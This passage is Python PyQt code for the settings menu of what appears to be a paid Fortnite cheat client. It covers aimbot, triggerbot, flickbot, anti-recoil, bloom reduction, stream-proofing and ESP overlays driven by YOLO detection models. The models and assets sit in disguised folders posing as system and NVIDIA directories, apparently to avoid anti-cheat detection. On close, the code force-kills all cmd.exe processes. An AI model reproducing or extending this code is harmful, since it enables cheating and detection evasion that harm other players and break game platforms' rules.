        profile_layout.addWidget(self.info_label_7)
        profile_layout.addSpacing(3)
        profile_layout.addWidget(separator_line7)
        profile_layout.addSpacing(3)
        profile_layout.addWidget(self.info_label_8)
        #profile_layout.addWidget(self.info_label_9)
        profile_layout.addWidget(self.info_label_10)
        profile_layout.addWidget(self.info_label_11)
        profile_layout.addWidget(self.info_label_13)

        profile_layout.addSpacing(3)

        profile_layout.addWidget(self.btn_extraini)

        profile_layout.addSpacing(5)
        profile_layout.addWidget(separator_line9)
        profile_layout.addWidget(self.Welcome_label_5)

        advanced_layout = QVBoxLayout()
        advanced_layout.addSpacing(3)
        advanced_layout.addWidget(self.Use_Model_Class_checkbox)
        advanced_layout.addSpacing(3)
        # Image Scaling
        button_container_layout_class = QHBoxLayout()
        button_container_layout_class.addWidget(self.img_value_combobox)
        button_container_layout_class.addWidget(self.img_value_label)
        advanced_layout.addLayout(button_container_layout_class)
        advanced_layout.addSpacing(3)
        # Model Selector
        button_container_layout_model = QHBoxLayout()
        button_container_layout_model.addWidget(self.model_selected_combobox)
        button_container_layout_model.addWidget(self.model_selected_label)
        advanced_layout.addLayout(button_container_layout_model)
        advanced_layout.addSpacing(3)
        # Max Detections
        button_container_layout_maxdet = QHBoxLayout()
        button_container_layout_maxdet.addWidget(self.slider4)
        button_container_layout_maxdet.addWidget(self.Max_Detections_label)
        advanced_layout.addLayout(button_container_layout_maxdet)
        # Model FPS
        button_container_layout_fps = QHBoxLayout()
        button_container_layout_fps.addWidget(self.slider_fps)
        button_container_layout_fps.addWidget(self.fps_label)
        advanced_layout.addLayout(button_container_layout_fps)
        advanced_layout.addSpacing(5)
        advanced_layout.addWidget(separator_line13)
        advanced_layout.addWidget(self.Welcome_label_6)




        aimbot_layout.setAlignment(Qt.AlignTop)
        slots_layout.setAlignment(Qt.AlignTop)
        flickbot_layout.setAlignment(Qt.AlignTop)
        visual_layout.setAlignment(Qt.AlignTop)
        extra_layout.setAlignment(Qt.AlignTop)
        profile_layout.setAlignment(Qt.AlignTop)
        advanced_layout.setAlignment(Qt.AlignTop)
        stacked_widget = QStackedWidget()
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.addWidget(QWidget())
        stacked_widget.widget(0).setLayout(aimbot_layout)
        stacked_widget.widget(1).setLayout(slots_layout)
        stacked_widget.widget(2).setLayout(flickbot_layout)
        stacked_widget.widget(3).setLayout(visual_layout)
        stacked_widget.widget(4).setLayout(extra_layout)
        stacked_widget.widget(5).setLayout(profile_layout)
        stacked_widget.widget(6).setLayout(advanced_layout)
        layout = QVBoxLayout()
        layout.addLayout(banner_layout)
        layout.addWidget(button_container)
        layout.addWidget(separator_line)
        layout.addWidget(stacked_widget)
        self.setLayout(layout)


        def set_button_style(selected_button):
            btn_aimbot.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Aimbot" else menu_tab_style)
            btn_aimbot.setIcon(QIcon(f"C:\\ProgramData\\Astro\\Assets\\Images\\skull-highlighted.png") if selected_button == "Aimbot" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\skull.png"))

            btn_slots.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Slots" else menu_tab_style)
            btn_slots.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\gun-highlighted.png") if selected_button == "Slots" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\gun.png"))

            btn_flickbot.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Flickbot" else menu_tab_style)
            btn_flickbot.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\bullet-highlighted.png") if selected_button == "Flickbot" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\bullet.png"))

            btn_visual.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Visual" else menu_tab_style)
            btn_visual.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\view-highlighted.png") if selected_button == "Visual" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\view.png"))

            btn_extra.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Extra" else menu_tab_style)
            btn_extra.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\application-highlighted.png") if selected_button == "Extra" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\application.png"))

            btn_profile.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Profile" else menu_tab_style)
            btn_profile.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\profile-highlighted.png") if selected_button == "Profile" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\profile.png"))

            btn_advanced.setStyleSheet(self.menu_tab_selected_style() if selected_button == "Model" else menu_tab_style)
            btn_advanced.setIcon(QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\brain-highlighted.png") if selected_button == "Model" else QIcon("C:\\ProgramData\\Astro\\Assets\\Images\\brain.png"))

        set_button_style("Aimbot")
        btn_aimbot.clicked.connect(lambda: set_button_style("Aimbot"))
        btn_slots.clicked.connect(lambda: set_button_style("Slots"))
        btn_flickbot.clicked.connect(lambda: set_button_style("Flickbot"))
        btn_visual.clicked.connect(lambda: set_button_style("Visual"))
        btn_extra.clicked.connect(lambda: set_button_style("Extra"))
        btn_profile.clicked.connect(lambda: set_button_style("Profile"))
        btn_advanced.clicked.connect(lambda: set_button_style("Model"))
        btn_aimbot.clicked.connect(lambda: stacked_widget.setCurrentIndex(0))
        btn_slots.clicked.connect(lambda: stacked_widget.setCurrentIndex(1))
        btn_flickbot.clicked.connect(lambda: stacked_widget.setCurrentIndex(2))
        btn_visual.clicked.connect(lambda: stacked_widget.setCurrentIndex(3))
        btn_extra.clicked.connect(lambda: stacked_widget.setCurrentIndex(4))
        btn_profile.clicked.connect(lambda: stacked_widget.setCurrentIndex(5))
        btn_advanced.clicked.connect(lambda: stacked_widget.setCurrentIndex(6))

        self.slider.valueChanged.connect(self.on_slider_value_change)
        self.slider0.valueChanged.connect(self.on_slider0_value_change)
        self.slider3.valueChanged.connect(self.on_slider3_value_change)
        self.slider4.valueChanged.connect(self.on_slider4_value_change)
        self.slider5.valueChanged.connect(self.on_slider5_value_change)
        self.slider6.valueChanged.connect(self.on_slider6_value_change)
        self.slider60.valueChanged.connect(self.on_slider60_value_change)

        # Slots
        self.slider_slot1.valueChanged.connect(self.on_slider_slot1_value_change)
        self.slider_slot2.valueChanged.connect(self.on_slider_slot2_value_change)
        self.slider_slot3.valueChanged.connect(self.on_slider_slot3_value_change)
        self.slider_slot4.valueChanged.connect(self.on_slider_slot4_value_change)
        self.slider_slot5.valueChanged.connect(self.on_slider_slot5_value_change)

        self.Enable_Aim_Slot1_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot2_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot3_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot4_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Aim_Slot5_checkbox.stateChanged.connect(self.on_checkbox_state_change)

        self.flick_scope_slider.valueChanged.connect(self.on_flick_scope_slider_value_change)
        self.flick_cool_slider.valueChanged.connect(self.on_flick_cool_slider_value_change)
        self.flick_delay_slider.valueChanged.connect(self.on_flick_delay_slider_value_change)
        self.aim_bone_combobox.currentIndexChanged.connect(self.update_aim_bone)
        self.smoothing_type_combobox.currentIndexChanged.connect(self.update_smoothing_type)
        self.box_type_combobox.currentIndexChanged.connect(self.update_box_type)
        self.Enable_Aim_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Slots_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Fov_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Crosshair_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Detections_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Aimline_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Require_Keybind_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_Debug_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_FPS_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Show_CMD_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_TriggerBot_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Controller_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.CupMode_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        #self.Streamproof_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Reduce_Bloom_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Require_ADS_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.AntiRecoil_On_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Enable_Flick_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        #self.hue_slider.valueChanged.connect(self.update_rgb_label)
        #self.lightness_slider.valueChanged.connect(self.update_rgb_label)
        #self.opacity_slider.valueChanged.connect(self.update_rgb_label)
        self.Use_Hue_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.Use_Model_Class_checkbox.stateChanged.connect(self.on_checkbox_state_change)
        self.img_value_combobox.currentIndexChanged.connect(self.update_img_value)

        self.model_selected_combobox.currentIndexChanged.connect(self.on_model_selected)

        self.slider_fps.valueChanged.connect(self.on_slider_fps_value_change)

        try:
            self.font_size = open("C:\\ProgramData\\Astro\\Assets\\size.txt", "r").read()
        except:
            self.font_size = 15

        self.update_stylesheet()

    def load_modelss(self):
        try:
            model_files = [f for f in os.listdir('model') if f.endswith(('.engine', '.pt', '.onnx'))]
        except:
            model_files = [f for f in os.listdir(open(rf"{current_directory}\model","r").read()) if f.endswith(('.engine', '.pt', '.onnx'))]

        # Load default models from specified directory
        default_model_dir = 'C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\'
        default_model_files = [f for f in os.listdir(default_model_dir) if f.endswith(('.engine', '.pt'))]

        # Map user-friendly labels to actual file names
        default_models = {}
        for file in default_model_files:
            if 'FortnitePro' in file:
                label = "FortnitePro" + os.path.splitext(file)[1]
                default_models[label] = file 
            elif 'Fortnite' in file:
                label = "Fortnite" + os.path.splitext(file)[1]
                default_models[label] = file 
            # elif 'FortnitePro' in file:
            # 	label = "FortnitePro" + os.path.splitext(file)[1]
            # 	default_models[label] = file 
            # elif 'WINDOWSEN' in file:
            # 	label = "NiteZero" + os.path.splitext(file)[1]
            # 	default_models[label] = file 
            # elif 'WINDOWSUN' in file:
            # 	label = "UniversalZero" + os.path.splitext(file)[1]
            # 	default_models[label] = file 

        self.modelss = {}

        invalid_models = []
        for model_file in model_files:
            try:
                model_path = os.path.join('model', model_file)
            except:
                model_path = os.path.join(open(rf"{current_directory}\model","r").read(), model_file)
            try:
                model_instance = YOLO(model_path, task='detect')
                self.modelss[model_file] = model_instance
                self.model_selected_combobox.addItem(model_file)
            except Exception as e:
                invalid_models.append(model_file)

        # Process default models
        for label, file_name in default_models.items():
            model_path = os.path.join(default_model_dir, file_name)
            try:
                model_instance = YOLO(model_path, task='detect')
                self.modelss[label] = model_path  # Store the path for later use
                self.model_selected_combobox.addItem(label)
            except Exception as e:
                invalid_models.append(label)

        # Set default model if no models are loaded
        if not model_files and not default_models:
            message = "No model files found in the directory, using default model."
            caption = "Error 0401: Model Finding Error"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)
            if default_models:
                default_model = next(iter(default_models.values()), None)
                if default_model:
                    MyWindow.modell = YOLO(os.path.join(default_model_dir, default_model))
            return

        # Select the last loaded model or fallback to the first available model
        if Last_Model and Last_Model in self.modelss:
            try:
                model_path = self.modelss[Last_Model]
                MyWindow.modell = YOLO(model_path, task='detect')
                self.model_selected_combobox.setCurrentText(Last_Model)
            except Exception as e:
                fallback_model = next(iter(self.modelss.values()), None)
                if fallback_model:
                    MyWindow.modell = fallback_model
                    self.model_selected_combobox.setCurrentIndex(0)
        else:
            fallback_model = next(iter(self.modelss.values()), None)
            if fallback_model:
                MyWindow.modell = fallback_model
                self.model_selected_combobox.setCurrentIndex(0)

        # Report any invalid models
        if invalid_models:
            invalid_models_str = "\n".join(invalid_models)
            message = f"The following models failed to load and are being ignored:\n\n{invalid_models_str}"
            caption = "Error 0407: Model Loading Error"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

    def on_model_selected(self):
        global Last_Model
        model_name = self.model_selected_combobox.currentText()

        default_models = [
            'Fortnite'
        ]

        # Determine if the selected model is from the 'model' directory or default directory
        model_path = None
        if any(default_model in model_name for default_model in default_models):
            # Get the actual file name for the selected default model
            file_name = self.modelss.get(model_name, None)
            if file_name:
                model_path = os.path.join('C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr', file_name)
        else:
            try:
                model_path = os.path.join(os.path.abspath('model'), model_name)
            except:
                model_path = os.path.join(os.path.abspath('../model'), model_name)

        if model_path and os.path.isfile(model_path):
            try:
                MyWindow.modell = YOLO(model_path, task='detect')
                self.modelss[model_name] = model_path
            except Exception as e:
                message = f"Failed to load model {model_name} from {model_path}.\n\nError Details: {e}"
                caption = "Error 0437: Model Loading Failure"
                message_type = 0x10
                ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)
        else:
            message = f"Model {model_name} not found at {model_path}."
            caption = "Error 0444: Model Not Found"
            message_type = 0x10
            ctypes.windll.user32.MessageBoxW(0, message, caption, message_type)

        Last_Model = model_name
        self.auto_save_config()

    def update_theme_color(self):
        import re

        # Validate hex color code
        hex_color = self.color_input.text()
        if not re.fullmatch(r'#(?:[0-9a-fA-F]{3}){1,2}', hex_color):
            hex_color = '#ff0000'  # Default to red if invalid

        self.theme_hex_color = "#0f9cfa"#"#0f9cfa"
        self.update_stylesheet()
        self.update_button_style()
        self.update_menu_tab_style()
        self.update_slider_style()
        self.update_label_colors()
        self.update()
        self.auto_save_config()

    def update_button_style(self):
        button_style = self.get_button_style()
        for button in self.findChildren(QPushButton):
            button.setStyleSheet(button_style)

    def update_menu_tab_style(self):
        menu_tab_style = self.menu_tab_selected_style()
        for button in self.findChildren(QPushButton):
            if "menu_tab" in button.objectName():
                button.setStyleSheet(menu_tab_style)

    def update_slider_style(self):
        slider_style = self.get_slider_style()
        for slider in self.findChildren(QSlider):
            slider.setStyleSheet(slider_style)

    def update_stylesheet(self):
        menu_main_style = f"""
            QWidget {{
                background-color: #000000;
                color: #ffffff;
                font-size: {self.font_size}px;
            }}
            QSlider::groove:horizontal {{
                border: 1px solid {self.widget_border_color};
                height: 10px;
                border-radius: 5px;
            }}
            QSlider::handle:horizontal {{
                background: {self.widget_bg_color};
                width: 10px;
                margin: -1px -1px;
                border-radius: 5px;
                border: 1px solid {self.theme_hex_color};
            }}
            QSlider::handle:horizontal:hover {{
                background: {self.theme_hex_color};
                border-color: {self.widget_border_color};
            }}

            QCheckBox::indicator:checked {{
                background: {self.theme_hex_color};
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/o.png);
            }}
            QCheckBox::indicator:unchecked {{
                background: {self.widget_bg_color};
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/x.png);
            }}
            QCheckBox::indicator {{
                border-radius : 5px;
                width: 20px;
                height: 20px;

            }}
            QCheckBox::indicator:focus {{
                background-color: transparent;
            }}

            QComboBox {{
                background-color: {self.widget_bg_color};
                color: #ffffff;
                font-size: {self.font_size}px;
                border-radius: 5px;
                border: 1px {self.widget_border_color};
                padding: 5px 30px 5px 8px;
            }}
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: top right;
                width: 20px;
                border-left-width: 1px;
                border-left-color: {self.widget_border_color};
                border-left-style: solid;
                border-top-right-radius: 5px;
                border-bottom-right-radius: 5px;
                background-color: {self.theme_hex_color};
            }}
            QComboBox::down-arrow {{
                width: 10px;
                height: 10px;
                image: url(C:/ProgramData/NVIDIA/NGX/models/config/d.png);
            }}
            QComboBox QAbstractItemView {{
                background-color: {self.widget_bg_color};
                color: #ffffff;
                selection-background-color: {self.theme_hex_color};
                selection-color: #ffffff;
                border: 1px solid {self.widget_border_color};
                border-radius: 5px;
                padding: 8px;
                font-size: {self.font_size}px;
            }}
            QLineEdit {{ 
                border: 2px solid {self.theme_hex_color};
            }}
        """

        self.setStyleSheet(menu_main_style)

    def get_slider_style(self):
        # return f"""
        # 	QSlider::groove:horizontal {{
        # 	border: 1px solid {self.widget_bg_color};
        # 	height: 12px;
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::handle:horizontal {{
        # 	background: {self.widget_bg_color};
        # 	width: 12px;
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::handle:horizontal:hover {{
        # 	background: {self.theme_hex_color};
        # 	border-color: {self.widget_border_color};
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::add-page:qlineargradient {{
        # 	background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 {self.widget_bg_color}, stop:1 {self.widget_border_color});
        # 	border-radius: 6px;
        # 	}}
        # 	QSlider::sub-page:qlineargradient {{
        # 	background: {self.theme_hex_color};
        # 	border-radius: 6px;
        # 	}}
        # """
        return f"""
QLineEdit {{
    border: 1px solid #0f9cfa;
    background-color: #4077c9;
    color: #abb2bf;
    border-radius: 4px;
    font-weight: bold;
}}

QSlider::groove:horizontal {{
    border: 1px solid #1f2128;
    height: 8px;
    background: #000000;
    border-radius: 4px;
}}

QSlider::handle:horizontal {{
    background: #000000;
    border: 2px solid #0f9cfa;
    width: 12px;
    height: 12px;
    margin: -4px 0;
    border-radius: 7px;
}}

QSlider::sub-page:horizontal {{
    background: #0f9cfa;
    border-radius: 4px;
}}

"""
    def format_time_difference(self,timestamp):
        timestamp_datetime = datetime.fromtimestamp(int(timestamp))
        now = datetime.now()
        difference = now - timestamp_datetime

        total_seconds = int(difference.total_seconds())
        if total_seconds < -10000:
            total_seconds = abs(total_seconds)

        minutes = 60
        hours = 3600
        days = 86400
        months = 2592000
        years = 31536000
        if total_seconds >= years:
            years_count = total_seconds // years
            return f"{years_count} year{'s' if years_count > 1 else ''}"
        if total_seconds >= months:
            months_count = total_seconds // months
            return f"{months_count} month{'s' if months_count > 1 else ''}"
        elif total_seconds >= days:
            days_count = total_seconds // days
            return f"{days_count} day{'s' if days_count > 1 else ''}"
        elif total_seconds >= hours:
            hours_count = total_seconds // hours
            return f"{hours_count} hour{'s' if hours_count > 1 else ''}"
        elif total_seconds >= minutes:
            minutes_count = total_seconds // minutes
            return f"{minutes_count} minute{'s' if minutes_count > 1 else ''}"
        else:
            seconds_count = total_seconds
            return f"{seconds_count} second{'s' if seconds_count > 1 else ''}"

    def get_button_style(self):
        return f"""
            QPushButton {{
                background-color: {self.theme_hex_color};
                color: white; border-radius:
                6px; border:
                2px solid {self.theme_hex_color};
                height: 20px;
            }} 

            QPushButton:hover {{
                background-color: {self.theme_hex_color};
            }}

            QPushButton:pressed {{ 
                background-color: {self.theme_hex_color}; 
            }}
        """

    def menu_tab_selected_style(self):
        return f"""
            QPushButton {{
                border: none;
                padding-bottom: 6px;
                margin-left: 60%;
                margin-right: 60%;
            }}
        """ #border-bottom: 2px solid {self.theme_hex_color};

    def create_mask(self):
        path = QPainterPath()
        radius = 5
        path.addRoundedRect(QRectF(0, 0, self.width(), self.height()), radius, radius)
        mask = QRegion(path.toFillPolygon().toPolygon())
        return mask
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setBrush(self.palette().window())
        painter.setPen(Qt.NoPen) 
        painter.drawRoundedRect(self.rect(), 20, 20)
        super().paintEvent(event)
        #painter.drawRoundedRect(rect, 6, 6)

    def update_label_colors(self):
        # Update the color for each label
        self.info_label_3.setText(f"<font color='{self.theme_hex_color}'>User Info:</font>")
        self.info_label_8.setText(f"<font color='{self.theme_hex_color}'>Hotkeys:</font>")
        #self.info_label_9.setText(f"Close Normally: <font color='{self.theme_hex_color}'>[X]</font>")
        self.info_label_10.setText(f"Quick On/Off: <font color='{self.theme_hex_color}'>[F1]</font>")
        self.info_label_11.setText(f"Close: <font color='{self.theme_hex_color}'>[F2]</font>")
        self.info_label_13.setText(f"Toggle Menu: <font color='{self.theme_hex_color}'>[INS]</font>")

    def update_labels(self):
        self.info_label_4.setText(f"Your Key: " + api.user_data.username[:20] + "*******")
        self.info_label_5.setText(f"Purchased: " + self.format_time_difference(api.user_data.createdate) + " ago")
        self.info_label_7.setText(f"Last Login: " + self.format_time_difference(api.user_data.lastlogin) + " ago")
        self.info_label_6.setText(f"Expiry: in " + self.format_time_difference(api.user_data.expires))

    def toggle_menu_visibility(self):
        if self.isVisible():
            try:
                self.hide()
            except:
                time.sleep(0.15)
                self.hide()
        else:
            try:
                self.show()
                self.raise_()
                self.activateWindow()
            except:
                time.sleep(0.15)
                self.show()
                self.raise_()
                self.activateWindow()


    def auto_save_config(self):
        #hue = self.hue_slider.value()
        #opacity = self.opacity_slider.value()
        #lightness = self.lightness_slider.value()
        color = self.calculate_color("0f9cfa", "", "")  # Pass lightness to calculate_color

        men_color = "#0f9cfa"

        if not men_color.startswith('#') or len(men_color) not in [7, 9]:
            men_color = '#fc0000'  # Default to white if invalid

        config_settings = {
            "Fov_Size": Fov_Size,
            "Confidence": Confidence,
            "Aim_Smooth": Aim_Smooth,
            "Max_Detections": Max_Detections,
            "Aim_Bone": Aim_Bone,
            "Smoothing_Type": Smoothing_Type,
            "Box_type": Box_type,
            "Enable_Aim": bool(Enable_Aim),
            "Enable_Slots": bool(Enable_Slots),
            "Controller_On": bool(Controller_On),
            "Keybind": self.Keybind,
            "Keybind2": self.Keybind2,
            "Enable_TriggerBot": bool(Enable_TriggerBot),
            "Show_Fov": bool(Show_Fov),
            "Show_Crosshair": bool(Show_Crosshair),
            "Show_Debug": bool(Show_Debug),
            "Show_FPS": bool(Show_FPS),
            "Auto_Fire_Fov_Size": Auto_Fire_Fov_Size,
            "Show_Detections": bool(Show_Detections),
            "Show_Aimline": bool(Show_Aimline),
            "Auto_Fire_Confidence": Auto_Fire_Confidence,
            "Auto_Fire_Keybind": self.Auto_Fire_Keybind,
            "Require_Keybind": bool(Require_Keybind),
            "Use_Hue": bool(Use_Hue),
            "CupMode_On": bool(CupMode_On),
            "Reduce_Bloom": bool(Reduce_Bloom),
            "Require_ADS": bool(Require_ADS),
            "AntiRecoil_On": bool(AntiRecoil_On),
            "AntiRecoil_Strength": AntiRecoil_Strength,
            "Theme_Hex_Color": men_color,
            "Enable_Flick_Bot": Enable_Flick_Bot,
            "Flick_Scope_Sens": Flick_Scope_Sens,
            "Flick_Cooldown": Flick_Cooldown,
            "Flick_Delay": Flick_Delay,
            "Flickbot_Keybind": self.Flickbot_Keybind,
            "Streamproof": Streamproof,

            "Enable_Aim_Slot1": bool(Enable_Aim_Slot1),
            "Enable_Aim_Slot2": bool(Enable_Aim_Slot2),
            "Enable_Aim_Slot3": bool(Enable_Aim_Slot3),
            "Enable_Aim_Slot4": bool(Enable_Aim_Slot4),
            "Enable_Aim_Slot5": bool(Enable_Aim_Slot5),
            "Slot1_Keybind": self.Slot1_Keybind,
            "Slot2_Keybind": self.Slot2_Keybind,
            "Slot3_Keybind": self.Slot3_Keybind,
            "Slot4_Keybind": self.Slot4_Keybind,
            "Slot5_Keybind": self.Slot5_Keybind,
            "Slot6_Keybind": self.Slot6_Keybind,
            "Fov_Size_Slot1": Fov_Size_Slot1,
            "Fov_Size_Slot2": Fov_Size_Slot2,
            "Fov_Size_Slot3": Fov_Size_Slot3,
            "Fov_Size_Slot4": Fov_Size_Slot4,
            "Fov_Size_Slot5": Fov_Size_Slot5,

            "Use_Model_Class": bool(Use_Model_Class),
            "Img_Value": Img_Value,
            "Model_FPS": Model_FPS,
            "Last_Model": Last_Model,

            "game": {
                "pixel_increment": pixel_increment,
                "randomness": randomness,
                "sensitivity": sensitivity,
                "distance_to_scale": distance_to_scale,
                "dont_launch_overlays": dont_launch_overlays,
                "use_mss": use_mss,
                "hide_masks":hide_masks
            }
        }

        global Keybind
        global Keybind2
        global Auto_Fire_Keybind
        global Flickbot_Keybind
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind

        Keybind = self.Keybind
        Keybind2 = self.Keybind2
        Auto_Fire_Keybind = self.Auto_Fire_Keybind
        Flickbot_Keybind = self.Flickbot_Keybind
        Slot1_Keybind = self.Slot1_Keybind
        Slot2_Keybind = self.Slot2_Keybind
        Slot3_Keybind = self.Slot3_Keybind
        Slot4_Keybind = self.Slot4_Keybind
        Slot5_Keybind = self.Slot5_Keybind
        Slot6_Keybind = self.Slot6_Keybind

        with open('./config.json', 'w') as outfile:
            jsond.dump(config_settings, outfile, indent=4)

        self.update_labels()

    def closeEvent(self, event):
        self.auto_save_config()
        try:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
            #event.accept()
        except:
            try:
                sys.exit()
            except:
                os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

    def update_aim_bone(self, index):
        self.Aim_Bone = self.aim_bone_combobox.currentText()
        global Aim_Bone
        if self.aim_bone_combobox.currentText() == "Head":
            Aim_Bone = "Head"
        if self.aim_bone_combobox.currentText() == "Neck":
            Aim_Bone = "Neck"
        if self.aim_bone_combobox.currentText() == "Body":
            Aim_Bone = "Body"
        self.auto_save_config()

    def update_smoothing_type(self, index):
        self.Smoothing_Type = self.smoothing_type_combobox.currentText()
        global Smoothing_Type
        if self.smoothing_type_combobox.currentText() == "Default":
            Smoothing_Type = "Default"
        if self.smoothing_type_combobox.currentText() == "Bezier":
            Smoothing_Type = "Bezier"
        if self.smoothing_type_combobox.currentText() == "Catmull-Rom":
            Smoothing_Type = "Catmull"
        if self.smoothing_type_combobox.currentText() == "Hermite":
            Smoothing_Type = "Hermite"
        if self.smoothing_type_combobox.currentText() == "B-Spline":
            Smoothing_Type = "B-Spline"
        if self.smoothing_type_combobox.currentText() == "Sine":
            Smoothing_Type = "Sine"
        if self.smoothing_type_combobox.currentText() == "Exponential":
            Smoothing_Type = "Exponential"
        self.auto_save_config()

    def update_box_type(self, index):
        self.Box_type = self.box_type_combobox.currentText()
        global Box_type
        if self.box_type_combobox.currentText() == "Regular":
            Box_type = "Regular"
        if self.box_type_combobox.currentText() == "Corner":
            Box_type = "Corner"
        if self.box_type_combobox.currentText() == "Filled":
            Box_type = "Filled"
        self.auto_save_config()


    def update_img_value(self, index):
        self.Img_Value = self.img_value_combobox.currentText()
        global Img_Value
        if self.img_value_combobox.currentText() == "320":
            Img_Value = "320"
        if self.img_value_combobox.currentText() == "480":
            Img_Value = "480"
        if self.img_value_combobox.currentText() == "640":
            Img_Value = "640"
        if self.img_value_combobox.currentText() == "736":
            Img_Value = "736"
        if self.img_value_combobox.currentText() == "832":
            Img_Value = "832"
        self.auto_save_config()

    def temp_spoof(self):
        ...

    def refresh_extra(self):

        global pixel_increment
        global randomness
        global sensitivity
        global distance_to_scale
        global dont_launch_overlays
        global use_mss
        global hide_masks

        #SECRET CONFIG
        secretfile = open('./config.json')
        secretconfig = jsond.load(secretfile)["game"]
        pixel_increment = secretconfig['pixel_increment']
        randomness = secretconfig['randomness']
        sensitivity = secretconfig['sensitivity']
        distance_to_scale = secretconfig['distance_to_scale']
        dont_launch_overlays = secretconfig['dont_launch_overlays']
        use_mss = secretconfig['use_mss']
        hide_masks = secretconfig['hide_masks']

        self.auto_save_config()

    def start_select_hotkey(self):
        self.is_selecting_hotkey = True
        self.Keybind = None
        self.btn_hotkey.setText("...")
        threading.Thread(target=self.listen_for_hotkey).start()
        self.auto_save_config()

    def listen_for_hotkey(self):
        while self.is_selecting_hotkey:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Keybind = vk
                    self.is_selecting_hotkey = False
                    key_name_converted = KEY_NAMES.get(self.Keybind, f"0x{self.Keybind:02X}")
                    self.btn_hotkey.setText(f"{key_name_converted}")
                    self.auto_save_config()
                    break

    def start_select_hotkey2(self):
        self.is_selecting_hotkey2 = True
        self.Keybind2 = None
        self.btn_hotkey2.setText("...")
        threading.Thread(target=self.listen_for_hotkey2).start()
        self.auto_save_config()

    def listen_for_hotkey2(self):
        while self.is_selecting_hotkey2:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Keybind2 = vk
                    self.is_selecting_hotkey2 = False
                    key_name_converted2 = KEY_NAMES.get(self.Keybind2, f"0x{self.Keybind2:02X}")
                    self.btn_hotkey2.setText(f"{key_name_converted2}")
                    self.auto_save_config()
                    break

    def start_select_hotkey3(self):
        self.is_selecting_hotkey3 = True
        self.Auto_Fire_Keybind = None
        self.btn_hotkey3.setText("...")
        threading.Thread(target=self.listen_for_hotkey3).start()
        self.auto_save_config()

    def listen_for_hotkey3(self):
        while self.is_selecting_hotkey3:
            for vk in range(256):
                if win32api.GetKeyState(vk) in (-127, -128):
                    self.Auto_Fire_Keybind = vk
                    self.is_selecting_hotkey3 = False
                    key_name_converted3 = KEY_NAMES.get(self.Auto_Fire_Keybind, f"0x{self.Auto_Fire_Keybind:02X}")
                    self.btn_hotkey3.setText(f"{key_name_converted3}")
                    self.auto_save_config()
                    break

    def start_select_hotkey4(self):
        self.is_selecting_hotkey4 = True
        self.Flickbot_Keybind = None
        self.btn_hotkey4.setText("...")
